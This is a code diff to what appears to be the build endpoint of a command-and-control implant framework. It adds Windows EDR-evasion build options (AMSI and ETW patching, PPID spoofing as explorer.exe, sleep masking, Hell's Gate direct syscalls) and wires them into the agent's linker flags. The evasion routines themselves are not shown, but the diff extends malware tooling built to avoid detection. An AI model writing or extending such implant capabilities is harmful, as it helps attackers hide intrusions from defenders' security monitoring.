@@ -43,6 +43,13 @@ class BuildRequest(BaseModel):
     jitter_mode: str = "linear" # linear | gaussian | sinusoidal | burst
     enc_key: str = ""           # 32-byte hex AES-256 key (optional, ECDH preferred)
     build_stager: bool = False  # build minimal stager instead of full agent
+    # ── Faz 2: EDR Evasion (Windows) ──────────────────────────────────────
+    enable_amsi: bool = False       # patch AmsiScanBuffer on startup
+    enable_etw: bool = False        # patch EtwEventWrite on startup
+    enable_ppid: bool = False       # PPID spoofing for child processes
+    ppid_target: str = "explorer.exe"
+    enable_sleep_mask: bool = False # encrypt sensitive data during sleep
+    enable_syscalls: bool = False   # Hell's Gate direct syscalls
 
 
 def _build_env(p: dict) -> dict:
@@ -112,7 +119,13 @@ def build_agent(req: BuildRequest, _: str = Depends(get_current_operator)):
             f"-X main.ProfileHeaders={pf['ProfileHeaders']} "
             f"-X main.ProfileContentType={pf['ProfileContentType']} "
             f"-X main.ProfileRespPrefix={pf['ProfileRespPrefix']} "
-            f"-X main.ProfileRespSuffix={pf['ProfileRespSuffix']}"
+            f"-X main.ProfileRespSuffix={pf['ProfileRespSuffix']} "
+            f"-X main.EnableAmsi={'1' if req.enable_amsi else '0'} "
+            f"-X main.EnableEtw={'1' if req.enable_etw else '0'} "
+            f"-X main.EnablePpid={'1' if req.enable_ppid else '0'} "
+            f"-X main.PpidTarget={req.ppid_target} "
+            f"-X main.EnableSleepMask={'1' if req.enable_sleep_mask else '0'} "
+            f"-X main.EnableSyscalls={'1' if req.enable_syscalls else '0'}"
         )
         src = AGENT_SRC
 
